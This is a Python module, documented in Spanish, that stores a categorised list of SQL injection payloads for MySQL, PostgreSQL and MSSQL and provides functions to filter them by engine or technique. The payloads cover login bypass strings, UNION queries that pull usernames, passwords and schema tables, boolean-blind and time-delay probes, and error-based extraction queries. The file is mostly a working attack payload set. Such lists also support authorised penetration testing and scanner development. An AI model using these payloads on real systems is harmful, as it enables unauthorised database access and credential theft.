"""
Módulo de Gestión de Payloads SQL Injection - Versión Multi-DB COMPLETA
"""

PAYLOADS = {
    'basic': [
        "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'/*", "admin'--", "admin'/*",
        "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*", "') OR '1'='1--", "') OR ('1'='1--",
        "' OR 'a'='a", "' OR 'a'='a'--", "' OR 'a'='a'/*", "1' OR '1'='1", "1' OR '1'='1'--"
    ],
    'union': {
        'generic': [
            "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--", "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT 1,2,3--", "' UNION SELECT 1,2,3,4,5--",
    
            "' UNION SELECT * FROM users--",
            "' UNION SELECT table_name FROM information_schema.tables--",
            "' UNION SELECT column_name FROM information_schema.columns--",
            "' UNION SELECT user,pass--",
            "' UNION SELECT username,password--"
        ],
        'mysql': [
            "' UNION SELECT @@version--", "' UNION SELECT database()--", 
            "' UNION SELECT user()--", "' UNION SELECT NULL,@@version--", 
            "' UNION SELECT NULL,NULL,@@version--"
        ],
        'postgresql': [
            "' UNION SELECT version(), current_user--",
            "' UNION SELECT CAST(table_name AS int) FROM information_schema.tables--"
        ]
    },
    'boolean_blind': [
        "' AND 1=1--", "' AND 1=2--", "' AND 'a'='a", "' AND 'a'='b", "' AND 1=1#",
        "' AND 1=2#", "1' AND 1=1--", "1' AND 1=2--", "1' AND '1'='1", "1' AND '1'='2"
    ],
    'time_based': {
        'mysql': [
            "'; SELECT SLEEP(5)--", "'; SELECT SLEEP(10)--", 
            "'; (SELECT * FROM (SELECT(SLEEP(5)))a)--", 
            "'; (SELECT * FROM (SELECT(SLEEP(10)))a)--",
            "' OR SLEEP(5)--", "' OR SLEEP(10)--"
        ],
        'postgresql': [
            "'; SELECT pg_sleep(5)--", "'; SELECT pg_sleep(10)--"
        ],
        'mssql': [
            "'; WAITFOR DELAY '00:00:05'--", "'; WAITFOR DELAY '00:00:10'--"
        ]
    },
    'error_based': {
        'mysql': [
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, @@version, 0x7e))--",
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(@@version,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "' AND 1=1 AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT user()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT table_name FROM information_schema.tables LIMIT 0,1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT column_name FROM information_schema.columns LIMIT 0,1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
        ],
        'postgresql': [
            "' AND 1=CAST((SELECT version()) AS int)--",
            "' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)--",
            "'; SELECT 1/0--"
        ],
        'mssql': [
            "' AND 1=CONVERT(int,@@version)--",
            "' AND 1=CAST(@@version AS int)--"
        ]
    }
}
def get_payloads_by_db(db_type='all'):
    """Filtra payloads por motor (mysql, postgresql, mssql o all)"""
    final = []
    for cat, content in PAYLOADS.items():
        if isinstance(content, list):
            for p in content:
                final.append({'payload': p, 'type': cat, 'category': cat})
        else:
            for db, p_list in content.items():
                if db_type == 'all' or db == db_type or db == 'generic' or db == 'original_misc':
                    for p in p_list:
                        final.append({'payload': p, 'type': cat, 'category': cat})
    return final

def get_all_payloads():
    return get_payloads_by_db('all')

def get_payloads_by_type(payload_type):
    if payload_type not in PAYLOADS: return []
    content = PAYLOADS[payload_type]
    if isinstance(content, list):
        return [{'payload': p, 'type': payload_type, 'category': payload_type} for p in content]
    flat = []
    for p_list in content.values():
        flat.extend(p_list)
    return [{'payload': p, 'type': payload_type, 'category': payload_type} for p in flat]

